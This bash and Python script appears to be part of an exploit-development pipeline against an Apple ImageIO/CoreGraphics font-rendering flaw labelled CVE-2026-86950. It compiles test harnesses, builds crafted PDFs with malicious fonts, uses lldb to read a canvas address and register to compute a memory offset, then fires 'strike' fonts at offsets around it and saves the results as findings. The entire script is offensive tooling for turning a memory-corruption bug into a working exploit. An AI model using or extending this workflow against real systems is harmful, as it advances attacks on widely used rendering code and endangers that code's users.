#!/bin/bash
# FINISH-2b: canvas strike v2 — public-API probe, same-session offset, strikes
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
ls -la render2
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python gen_pdf.py k2_q64.pdf k2_q64.ttf
lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_q64.pdf" \
  -o "continue" -o "register read x27" \
  -o "detach" -o "quit" ./render2 k2_q64.pdf cbase.png > canvas_sess.txt 2>&1 || true
grep -E "CANVAS|x27 =" canvas_sess.txt
./venv/bin/python - << 'PYEOF'
import re, subprocess, sys, os, hashlib
sys.path.insert(0, os.path.abspath('.'))
txt = open('canvas_sess.txt').read()
mb = re.search(r'CANVAS copybase=0x([0-9a-f]+)', txt)
mx = re.search(r'x27 = 0x([0-9a-f]+)', txt)
if not (mb and mx):
    print("MISS: canvas or x27 not captured"); sys.exit(0)
base = int(mb.group(1), 16); x27 = int(mx.group(1), 16)
off = base - x27; L0 = off // 64
print("canvas=0x%x x27=0x%x off=%d L0=%d" % (base, x27, off, L0))
if not (0 < L0 < 100000):
    print("L0 insane — different zone; strikes skipped"); sys.exit(0)
from gen_k2 import build_font
for L in sorted(set([L0-800, L0-400, L0, L0+400, L0+800, L0+1600])):
    if L <= 0: continue
    build_font(f"k2_s{L}.ttf", L)
    subprocess.run(['./venv/bin/python','gen_pdf.py',f'k2_s{L}.pdf',f'k2_s{L}.ttf'], check=True)
    rc = subprocess.run(['./render2',f'k2_s{L}.pdf',f'spng_{L}.png']).returncode
    d = open(f'spng_{L}.png','rb').read() if os.path.exists(f'spng_{L}.png') else b''
    print("strike L=%d rc=%d md5=%s" % (L, rc, hashlib.md5(d).hexdigest() if d else 'nopng'))
PYEOF
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{canvas_sess.txt,spng_*.png} findings/ 2>/dev/null
ls findings/ | wc -l
